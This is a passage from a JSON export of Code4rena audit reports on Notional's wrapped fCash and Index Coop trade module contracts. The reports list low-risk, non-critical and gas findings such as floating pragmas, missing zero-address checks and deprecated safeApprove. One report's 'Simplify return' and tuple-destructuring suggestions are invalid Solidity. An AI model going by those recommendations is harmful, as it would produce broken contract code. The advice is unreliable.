    "body": "## [L-01] Code vs Comment conflict: ERC20 vs ERC777\nComment indicates that ERC20 tokens are minted for the receiver but the contract inherits from ERC777.\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L97\n\n## [L-02] - Front-runnable initializer\nThe initialize function lacks access control and can be frontrun.\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L35\n\n## [L-03] Floating pragma and inconsistent compiler versions.\n`wfCashERC4626.sol` contains a floating pragma. The other wfCash contracts are set to version 0.8.11.\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L2\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L2\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L2\n\n## [L-04] Use of deprecated SafeApprove()\nThis function has been deprecated in lieu of safeIncreaseAllowance()\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L68\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L73",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/234"
    }
  },
  {
    "title": "QA Report",
    "body": "### Usage of pragma experimental ABIEncoderV2\n\n**Details**: Consider removing [L3](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L3) of wfCashLogic.sol, as:\n\n1. ABIEncoderV2 is not considered experimental anymore [since Solidity 0.7.4](https://docs.soliditylang.org/en/v0.8.7/layout-of-source-files.html#abiencoderv2); and\n2. ABIEncoderV2 is turned on by default [since Solidity 0.8.0](https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html).\n\n### Usage of deprecated function safeApprove\n\n**Details**: In [L66-75](https://github.com/notional-finance/wrapped-fcash/blob/0f3de25f1670fd19d3197e691284361dd913c616/contracts/wfCashBase.sol#L66-L75) of wfCashBase.sol the function `safeApprove` from OpenZeppelin contracts are used, however these functions have been deprecated according to [OpenZeppelin 4.x docs](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-).",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/233"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Codebase Impressions & Summary\n\nOverall, the contracts are very well implemented and the code quality is very high. Protocol developers provided adequate documentation and information on the protocol.\n\nRunning the test suite is extensive and covers most of the code, however, a few things stood out:\n\n- `test_wrapped_fcash.test_transfer_fcash_contract` is skipped\n- many tests are failing on the forked mainnet due to using addresses with insufficient token balances (e.g. `whales.DAI_EOA` has insufficient DAI tokens)\n- the `notionalTradeModule.spec` test suite has many open `TODOs`\n\n## Table of Contents\n\n- [Non-Critical Findings](#non-critical-findings)\n  - [[NC-01] Use the `isETH` return value from `wfCashBase.getToken` instead of checking equality with `ETH_ADDRESS`](#nc-01-use-the-iseth-return-value-from-wfcashbasegettoken-instead-of-checking-equality-with-eth_address)\n- [Low Risk](#low-risk)\n  - [[L-01] Zero-address checks are missing](#l-01-zero-address-checks-are-missing)\n  - [[L-02] Use of floating pragma](#l-02-use-of-floating-pragma)\n  - [[L-03] Events not emitted for important state changes](#l-03-events-not-emitted-for-important-state-changes)\n  - [[L-04] Matured fCash positions not automatically redeemed in `NotionalTradeModule.initialize`](#l-04-matured-fcash-positions-not-automatically-redeemed-in-notionaltrademoduleinitialize)\n  - [[L-05] Misleading `NotionalTradeModule._mintFCashPosition` function comments](#l-05-misleading-notionaltrademodule_mintfcashposition-function-comments)\n  - [[L-06] Misleading comment in `wfCashLogic._burn` function](#l-06-misleading-comment-in-wfcashlogic_burn-function)\n  - [[L-07] Matured fCash can still be wrapped via `ERC1155` `transfer`](#l-07-matured-fcash-can-still-be-wrapped-via-erc1155-transfer)\n  - [[L-08] Contracts are using outdated OpenZeppelin version `^3.4.2-solc-0.7`](#l-08-contracts-are-using-outdated-openzeppelin-version-342-solc-07)\n  - [[L-09] `wfCashERC4626` contract does not conform to `EIP4626`](#l-09-wfcasherc4626-contract-does-not-conform-to-eip4626)\n\n## Non-Critical Findings\n\n### [NC-01] Use the `isETH` return value from `wfCashBase.getToken` instead of checking equality with `ETH_ADDRESS`\n\n#### Description\n\nThe `wfCashBase.getToken` returns `bool isETH` which can be used to figure out if the returned token is the native ETH token.\n\n#### Findings\n\n[NotionalTradeModule.sol#L400-L403](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L400-L403)\n\n```solidity\n(IERC20 receiveToken,) = fCashPosition.getToken(toUnderlying);\nif(address(receiveToken) == ETH_ADDRESS) { // @audit-info use returned `isETH` variable from above function instead\n    receiveToken = weth;\n}\n```\n\n#### Recommended mitigation steps\n\nConsider using the returned `isETH` variable:\n\n```solidity\n(IERC20 receiveToken, bool isETH) = fCashPosition.getToken(toUnderlying);\nif(isETH) {\n    receiveToken = weth;\n}\n```\n\n## Low Risk\n\n### [L-01] Zero-address checks are missing\n\n#### Description\n\nZero-address checks are a best practice for input validation of critical address parameters. While the codebase applies this to most cases, there are many places where this is missing in constructors and setters.\n\nImpact: Accidental use of zero-addresses may result in exceptions, burn fees/tokens, or force redeployment of contracts.\n\n#### Findings\n\n**[NotionalTradeModule.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol)**\n\n[L140](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L140) - `wrappedfCashFactory = _wrappedfCashFactory;`\\\n [L141](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L141) - `weth = _weth;`\n\n**[wfCashBase.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol)**\n\n[L30](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L30) - `NotionalV2 = _notional;`\\\n [L31](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashBase.sol#L31) - `WETH = _weth;`\n\n**[WrappedfCashFactory.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/proxy/WrappedfCashFactory.sol)**\n\n[L18](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/proxy/WrappedfCashFactory.sol#L18) - `BEACON = _beacon;`\n\n#### Recommended mitigation steps\n\nAdd zero-address checks, e.g.:\n\n```solidity\nrequire(_weth != address(0), \"Zero-address\");\n```\n\n### [L-02] Use of floating pragma\n\n#### Description\n\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nhttps://swcregistry.io/docs/SWC-103\n\n#### Findings\n\n[wfCashERC4626.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L2) `pragma solidity ^0.8.0;`\n\n#### Recommended mitigation steps\n\nLock the pragma version to the same version as used in the other contracts and also consider known bugs (https://github.com/ethereum/solidity/releases) for the compiler version that is chosen.\n\nPragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile it locally.\n\n### [L-03] Events not emitted for important state changes\n\n#### Description\n\nWhen changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools.\n\n#### Findings\n\n[NotionalTradeModule.sol#L301](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L301) `function setRedeemToUnderlying(ISetToken _setToken, bool _toUnderlying)`\n\n#### Recommended mitigation steps\n\nEmit events for state variable changes.\n\n### [L-04] Matured fCash positions not automatically redeemed in `NotionalTradeModule.initialize`\n\n#### Description\n\nThe function comments imply that matured fCash positions are redeemed within `NotionalTradeModule.initialize`. However, this redemption is not implemented in this function.\n\n#### Findings\n\n[NotionalTradeModule.sol#L216](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L216)\n\n```solidity\n* Redeem all fCash positions that have reached maturity for their asset token (cToken)\n```\n\n#### Recommended mitigation steps\n\nConsider calling the function `_redeemMaturedPositions` to redeem matured fCash positions or adapt the function comments.\n\n### [L-05] Misleading `NotionalTradeModule._mintFCashPosition` function comments\n\n#### Description\n\nThe function comments imply that the given fCash position is redeemed. However, this function implements **minting** fCash tokens.\n\n#### Findings\n\n[NotionalTradeModule.sol#L415](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L415)\n\n```solidity\n* @dev Redeem a given fCash position from the specified send token (either underlying or asset token)\n```\n\n#### Recommended mitigation steps\n\nFix the comments to mention minting instead of redeeming.\n\n### [L-06] Misleading comment in `wfCashLogic._burn` function\n\n#### Description\n\nThe comment next to the `_withdrawCashToAccount` function call implies that the `from` address is the withdrawal receiver. However, `opts.receiver` is the receiver.\n\n#### Findings\n\n[wfCashLogic.sol#L230](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L230)\n\n```solidity\n // Transfer withdrawn tokens to the `from` address // @audit-info wrong comment - should be `... to the `opts.receiver` address`\n  _withdrawCashToAccount(\n      currencyId,\n      opts.receiver,\n      _safeUint88(assetInternalCashClaim),\n      opts.redeemToUnderlying\n  );\n```\n\n#### Recommended mitigation steps\n\nFix the comment.\n\n### [L-07] Matured fCash can still be wrapped via `ERC1155` `transfer`\n\n#### Description\n\nContrary to the key invariants stated in the [README](https://github.com/code-423n4/2022-06-notional-coop/) (_\"After maturity, wrapped fCash can no longer be minted.\"_), matured fCash can be sent to this `wfCash` contract to receive wrapped fCash tokens in return.\n\n#### Findings\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L107-L152\n\n#### Recommended mitigation steps\n\nConsider adding a check for fCash maturity:\n\n```solidity\nrequire(!hasMatured(), \"fCash matured\");\n```\n\n### [L-08] Contracts are using outdated OpenZeppelin version `^3.4.2-solc-0.7`\n\n#### Description\n\nWithin `notional-wrapped-fcash` `package.json`, an outdated OZ version is used (which has known vulnerabilities, see https://snyk.io/vuln/npm%3A%40openzeppelin%2Fcontracts).\n\nHowever, as `Brownie` is used to install dependencies and compile the contracts, using this outdated version declared in the `package.json` does not impose any risks so far.\n\nAnyway, to prevent any issues in the future (e.g. using solely `hardhat` to compile and deploy the contracts), upgrade the used OZ packages within the `package.json` to the latest versions.\n\nSee similar findings:\n\n- https://github.com/code-423n4/2022-02-hubble-findings/issues/81\n- https://github.com/code-423n4/2022-02-hubble-findings/issues/81\n\n#### Findings\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/package.json#L14\n\n#### Recommended mitigation steps\n\nConsider using the latest OZ packages within `package.json`.\n\n### [L-09] `wfCashERC4626` contract does not conform to `EIP4626`\n\n#### Description\n\nThe `wfCashERC4626` contract implements the `EIP4626` standard ([EIP-4626: Tokenized Vault Standard](https://eips.ethereum.org/EIPS/eip-4626)).\n\nHowever, according to `EIP4626`, the below-mentioned functions do not fully adhere to the specs. They possibly revert due to `require` checks or revert due to external calls reverting.\n\n#### Findings\n\n[L47](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L47) - `function totalAssets() public view override returns (uint256)`\n\nPossibly reverts due to `_getMaturedValue` and `_getPresentValue` reverting.\n\n[L52](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52) - `function convertToShares(uint256 assets) public view override returns (uint256 shares)`\n\nPossibly reverts due to `_getPresentValue` and `totalAssets` reverting.\n\n[L64](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L64) - `function convertToAssets(uint256 shares) public view override returns (uint256 assets)`\n\nPossibly reverts due to `_getPresentValue` and `totalAssets` reverting.\n\n[L85](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L85) - `function maxWithdraw(address owner) public view override returns (uint256)`\n\nPossibly reverts due to `convertToShares` within `previewWithdraw` reverting.\n\n#### Recommended mitigation steps\n\nGiven the circumstances, in most of the mentioned cases, it's not possible to implement it without ever reverting. Nevertheless, I want to point out that this contract does not fully conform with the `EIP4626` standard.\n",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/215"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations\n\n## Table of Contents\n\n- [[G-01] Public functions that could be declared external to save gas](#g-01-public-functions-that-could-be-declared-external-to-save-gas)\n- [[G-02] Remove unused function to save gas](#g-02-remove-unused-function-to-save-gas)\n- [[G-03] Prevent zero transfers](#g-03-prevent-zero-transfers)\n- [[G-04] Revert early when depositing assets which leads to `0` shares due to rounding down to `0`](#g-04-revert-early-when-depositing-assets-which-lead-to-0-shares-due-to-rounding-down-to-0)\n\n### [G-01] Public functions that could be declared external to save gas\n\n#### Description\n\nFollowing functions should be declared `external`, as functions that are never called by the contract internally should be declared external to save gas.\n\n#### Findings\n\n[NotionalTradeModule.sol#L210](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L210) - `function redeemMaturedPositions(ISetToken _setToken)`\n\n**[notional-wrapped-fcash/contracts/wfCashERC4626.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol)**\n\n[L75](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L75) - `function maxDeposit(address)`\\\n [L80](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L80) - `function maxMint(address)`\\\n [L85](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L85) - `function maxWithdraw(address owner)`\\\n [L90](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L90) - `function maxRedeem(address owner)`\\\n [L152](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L152) - `function previewRedeem(uint256 shares)`\\\n [L169](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L169) - `function deposit(uint256 assets, address receiver)`\\\n [L178](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L178) - `function mint(uint256 shares, address receiver)`\\\n [L191](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L191) - `function withdraw(uint256 assets, address receiver, address owner)`\\\n [L209](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L209) - `function redeem(uint256 shares, address receiver, address owner)`\n\n#### Recommended mitigation steps\n\nUse the `external` attribute for functions never called from the contract.\n\n### [G-02] Remove unused function to save gas\n\n#### Description\n\nHaving any unused functions in the code cost unnecessary gas usage.\n\n#### Findings\n\n[wfCashERC4626.sol#L243-L247](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L243-L247)\n\n```solidity\nfunction _safeNegInt88(uint256 x) private pure returns (int88) {\n    int256 y = -int256(x);\n    require(int256(type(int88).min) <= y);\n    return int88(y);\n}\n```\n\n#### Recommended mitigation steps\n\nEvaluate if the function call should be used anywhere otherwise remove the function.\n\n> Attention: This `_safeNegInt88` is not safe as the name suggests.\n\n### [G-03] Prevent zero transfers\n\n#### Description\n\nChecking non-zero transfer values can avoid an external call to save gas. Checking if `tokensTransferred > 0` before making the external call to `safeTransfer` can save gas by avoiding the external call in such situations\n\n#### Findings\n\n[wfCashERC4626.sol#L243-L247](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L243-L247)\n\n```solidity\nfunction _sendTokensToReceiver(\n        IERC20 token,\n        address receiver,\n        bool isETH,\n        uint256 balanceBefore\n    ) private returns (uint256 tokensTransferred) {\n        uint256 balanceAfter = isETH ? address(this).balance : token.balanceOf(address(this));\n        tokensTransferred = balanceAfter - balanceBefore;\n\n        if (isETH) {\n            WETH.deposit{value: tokensTransferred}();\n            IERC20(address(WETH)).safeTransfer(receiver, tokensTransferred);\n        } else {\n            token.safeTransfer(receiver, tokensTransferred); // @audit-info check `tokensTransferred` for zero transfers\n        }\n    }\n```\n\n#### Recommended mitigation steps\n\nCheck for zero transfer and avoid calling `safeTransfer`.\n\n### [G-04] Revert early when depositing assets which leads to `0` shares due to rounding down to `0`\n\n#### Description\n\nThe function `wfCashERC4626.deposit` calculates the amount of `shares` to mint based on the given amount of `assets`.\n\nTo save gas and prevent unnecessary minting of `0` shares, validate the calculated `shares` value and revert early.\n\n#### Findings\n\n[wfCashERC4626.sol#L170](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L170)\n\n```solidity\nfunction deposit(uint256 assets, address receiver) public override returns (uint256) {\n    uint256 shares = previewDeposit(assets); // @audit-info missing protection against rounding down to 0 within Notional\n    // Will revert if matured\n    _mintInternal(assets, _safeUint88(shares), receiver, 0, true);\n    emit Deposit(msg.sender, receiver, assets, shares);\n    return shares;\n}\n```\n\n#### Recommended mitigation steps\n\n```solidity\nfunction deposit(uint256 assets, address receiver) public override returns (uint256) {\n    uint256 shares = previewDeposit(assets);\n    require(shares != 0, \"ZERO_SHARES\"); // @audit-info add check to revert early and to save gas\n    // Will revert if matured\n    _mintInternal(assets, _safeUint88(shares), receiver, 0, true);\n    emit Deposit(msg.sender, receiver, assets, shares);\n    return shares;\n}\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/213"
    }
  },
  {
    "title": "QA Report",
    "body": "# 1. salt is supposed to be an arbitrary value not 0 make it an arbitrary value and if not arbitrary it can lead to replay attacks.\n# 2. no emits  after important functions \n\n_burn function,redeem,redeemToassets and after the transfer calls  in wfcashlogic.sol\n# 3. Event is missing indexed fields\n\neach event should use three indexed fields if there are there or more fields\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L78\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L94\n# 4. best practice to make brownie config file to make notional-wrapped fcash its .yml to .yaml\n\nbrownie docs says the cofig file should be called brownie-config.yaml\nhttps://eth-brownie.readthedocs.io/en/stable/config.html\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/brownie-config.yml\n# 5. using a old version of solidity can be prone to bugs and no overflow check\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L19\n# 6 . using ^0.8.0 you can use one version for deloyment and diffrent version for testing which can cause issues.\n\ninstances include:\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L19\n\nmitigation: use =0.8.x and version but lock the version of solidity\n# 7.\ncode is little hard to read because of comments , remove the comments.\n\ninstances include:\nin wfcashbase.sol\ninstead `(IERC20 underlyingToken, /* */) = getUnderlyingToken();`\ninstead `(IERC20 assetToken, /* */, /* */) = getAssetToken();`\ninstead : `(token, /* */) = getUnderlyingToken()`\ninstead :`(token, /* */, /* */) = getAssetToken();`\nuse: `(IERC20 underlyingToken) = getUnderlyingToken();`\nuse:`(IERC20 assetToken) = getAssetToken();`\nuse: `(token,,)=getAssetToken();`\nuse: `(token,,)=getUnderlyingToken()`\n# 8 . typos\nshould be: reentracy  \nin  wfcashLogic.sol:222 and those 3 redeem function   \nmake it :Updatable  in notionalTradeModule.sol\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L114\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L117\n",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/209"
    }
  },
  {
    "title": "QA Report",
    "body": "1. Title : using `pragma abicoder V2`\n\nSince [`wfCashLogic.sol`](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L3) was using `pragma experimental ABIEncoderV2` and used pragma ^0.7.6, it because the ABI coder v2 is not considered experimental anymore, it can be selected via pragma abicoder v2  instead since Solidity 0.7.4.\n\n## Tools\n\nManual Review\n\n## Recommended Mitigation\nyou can change it into `pragma abicoder v2;`\n\n2. The way to use `ABIEncoderV2`\n\nThe standart used for pragma ABIEncoder for pragma solidity `0.6.10;`\n\n```\npragma experimental ABIEncoderV2;\n```\n\nSince it was good to use for usually for good readibility and code as well.\n\n## Tool Used \n\nManual Review\n\n3. Title : unclear comment becoming confusing\n\n1.) File : wfCashLogic.sol [Line.98](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L98)\n\nSince this was only used in function _mintInternal() and unclear what was `operatorAck` does to be used since cause it was one comment, that means operator Acknowledge (operatorAck). This was uncleared as an information. what was `operatorAck` does. if would be not do an operatorAck, comment can be deleted instead.\n\n2.) File : NotionalTradeModule.sol\n\n[416](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L416) :      * @dev Alo adjust the components / position of the set token accordingly\n\n[455](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L455) :      * @dev Alo adjust the components / position of the set token accordingly\n\nThis `Alo` was confusing since didn't know what it is stand for. It is typo? or it can be cleared as well. \n\n## Tool Used \nManual Review\n\n4. Title : Avoid floating pragmas: the version should be locked \n\nThe pragma declared at [wfCashERC4626.sol](https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashERC4626.sol) was used ^0.8.0. As the compiler can be use as 0.8.11 and consider locking at this version the same as another.\n\n## Tool Used \nManual Review\n\n5. Title : Related data should be grouped in a struct\n\nhttps://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L111-L118\n\nThe following `maps` , it can be grouped in structs. \n\n```\n    mapping(ISetToken => bool) public redeemToUnderlying;\n    mapping(ISetToken => bool) public allowedSetTokens;\n    bool public anySetAllowed;\n```\n\n## Tool Used\nManual Review \n\n6. Title : Simplify return\n\nreturns a value to the main program when exiting a function. You can do further operations on the returned value. This implementation below can be used to simplify code and good readibility.\n\n1.) File : contracts/protocol/modules/v1/NotionalTradeModule.sol [Line 172](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L172)\n\n```\n        return _mintFCashPosition(_setToken, wrappedfCash, IERC20(_sendToken), _mintAmount, _maxSendAmount);\n```\n\ninto :\n\n```\n        return _mintFCashPosition;\n```\n\n2.) File : contracts/protocol/modules/v1/NotionalTradeModule.sol [Line 201](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L201)\n\n```\n        return _redeemFCashPosition(_setToken, wrappedfCash, IERC20(_receiveToken), _redeemAmount, _minReceiveAmount);\n```\n\ninto :\n\n```\n        return _redeemFCashPosition;\n```\n\n7. Title : Typo Comment \n\n1.) File : contracts/protocol/modules/v1/NotionalTradeModule.sol [Line 215](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L215)\n\n`MNGER` change to `MANAGER`\n\n8. Title : Require Statement missing Reason String\n\n1.) File : contracts/wfCashERC4626.sol [Line. 42](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L42)\n\n```\n        require(pvExternal >= 0);\n```\n\n2.) File : contracts/wfCashERC4626.sol [Line. 245](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L245)\n\n```\n        require(int256(type(int88).min) <= y);\n```\n\n3.) File : contracts/wfCashLogic.sol [Line. 316](https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L316)\n\n```\n        require(x <= uint256(type(uint88).max));\n```\n\n9. Title : Consider make the constracts pausable\n\nThere are many external risks so the suggestion was it should  be consider making the contracts pausable, so if in the case of an unexpected event, the admin can pause transfers.\n\n## Tool Used\nManual Review\n\n##POC\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol\n\n## Recommended Mitigation Steps\nConsider making contracts Pausable",
    "dataSource": {
      "name": "code-423n4/2022-06-notional-coop-findings",
      "repo": "https://github.com/code-423n4/2022-06-notional-coop-findings",
      "url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/202"
    }
  },
  {
    "title": "QA Report",
